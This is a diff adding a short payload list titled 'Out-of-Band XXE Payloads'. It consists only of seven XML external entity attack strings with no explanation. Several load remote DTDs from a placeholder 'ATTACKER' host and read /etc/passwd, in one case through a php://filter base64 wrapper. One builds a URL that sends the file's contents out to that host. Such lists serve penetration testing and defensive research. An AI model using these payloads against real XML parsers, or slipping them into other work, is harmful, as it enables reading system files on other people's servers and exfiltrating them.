@@ -1,0 +1,8 @@
+# Out-of-Band XXE Payloads
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]><root>test</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/xxe">%xxe;%int;%trick;]><root>test</root>
+<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://ATTACKER/evil.dtd"><root>test</root>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">%dtd;]><data>&send;</data>
+<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">%dtd;]><data>&send;</data>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b "<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?x=%a;'>">%b;%c;]><foo>test</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/oob">]><root>&xxe;</root>
